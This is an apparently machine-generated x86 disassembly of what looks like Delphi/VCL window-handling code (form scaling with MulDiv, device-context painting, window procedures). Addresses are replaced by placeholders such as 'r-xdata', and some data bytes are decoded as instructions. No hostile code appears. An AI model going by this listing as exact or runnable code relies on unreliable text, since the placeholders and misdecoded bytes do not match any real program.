mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_4031a0
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_40357c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455453
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_455414
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_413d04
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4031a8
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_4039e4
sub_455494
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403454
and [ ebx + 0x2f4 ] 0xdf
sub_4554cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_454ad8
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_43c690
xor edx edx
mov eax ebx
call sub_43c6b4
mov edx 0x140
mov eax ebx
call sub_43c6dc
mov edx 0xf0
mov eax ebx
call sub_43c700
mov dl 0x1
mov eax [ r-xdata ]
call sub_4237ec
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_455de8
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d734
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_43bafc
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_4031a0
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_45614c
xor edx edx
mov eax ebx
call sub_43d0e4
xor edx edx
mov eax ebx
call sub_43d04c
mov dl 0x1
mov eax ebx
call sub_443848
mov edx ebx
mov eax [ rw-data ]
call sub_45a7b0
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_455645
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_419ccc
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_414088
xor edx edx
mov eax ebx
call sub_416c50
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_459658
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_4556b0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035e4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_45577a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_457fd4
mov eax [ ebp - 0x4 ]
call sub_443a0c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45a7e8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_403258
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_403258
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d250
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_454b50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455781
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_455794
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push j_sub_4036f8#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45614c
sub_4557da
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403454
test al al
jne r-xdata
call sub_403a60
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_403a0c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45614c
sub_455810
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_455851
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_455870
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43efdc
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_403454
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_457b18
sub_4558ac
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43c3f0
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_413de8
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_456f10
mov edx esi
mov eax ebp
call sub_414088
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_456ee8
mov edx esi
mov eax edi
call sub_456f10
jmp r-xdata
xor edx edx
mov eax edi
call sub_456ec4
sub_4559b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43ffa0
xor edx edx
push ebp
push sub_455c0e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43f6fc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43c93c
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43c980
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_455d40
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_43e0d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455c15
mov eax [ ebp - 0x4 ]
call sub_43ffa8
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_455018
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4431cc
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_455018
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4431cc
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_41cff8
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_41d000
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_455c1d
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_440a48
push 0x0
push 0x0
push ebx
push sub_455d24
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_455cf0
push ebx
push sub_455d08
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_455ccf
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_417348
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_43d04c
sub_455d5b
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_455018
mov ecx edi
mov edx esi
mov eax ebx
call sub_4431cc
mov eax ebx
call sub_455e44
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_41d09c
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_41d0b8
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43c968
mov ebp eax
push edi
push esi
mov eax ebx
call sub_43c924
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_4560ec
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_45611c
sub_455de8
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_443708
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_443a0c
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_458148
push eax
push 0x1
push 0x80
mov eax ebx
call sub_443708
push eax
call SendMessageA
pop ebx
retn
sub_455e7c
push ebx
mov ebx eax
mov eax ebx
call sub_456d98
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_455f10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_443708
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_4437d0
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_443708
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_443708
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_455f98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_443cac
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_41a050
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41a024
mov edi eax
mov eax edi
mov si 0xfff1
call sub_403454
test al al
jne r-xdata
sub_456004
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_4031a0
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_456030
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax ebp
call sub_440438
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_41a050
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_443cf4
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_41a024
mov si 0xfff1
call sub_403454
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_41a060
jmp r-xdata
sub_4560c4
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_43d108
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43e0d4
sub_4560ec
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43c93c
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_45611c
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43c980
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_45614c
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_43ce40
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_457284
pop esi
pop ebx
retn
sub_456190
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_4561e9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4561f0
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
sub_4561f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_43cdf4
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_440c60
mov eax ebx
call sub_440dfc
sub_456230
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_419e9c
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_456270
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44111c
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403454
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403454
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_43e0d4
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_43e0d4
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_43e0d4
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_43e0d4
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_43e0d4
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_43e0d4
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_450394
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_456b9c
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d734
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4564e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4564cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41ddac
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41dc4c
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_45187c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4564d3
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41ddac
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_450394
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_456b9c
call sub_443708
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_456617
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d734
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4565f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4565d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41ddac
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41dc4c
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4565da
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41ddac
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_443708
mov esi eax
sub_4565f7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call ReleaseDC
retn
sub_4566a8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_4566f4
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_456bd0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
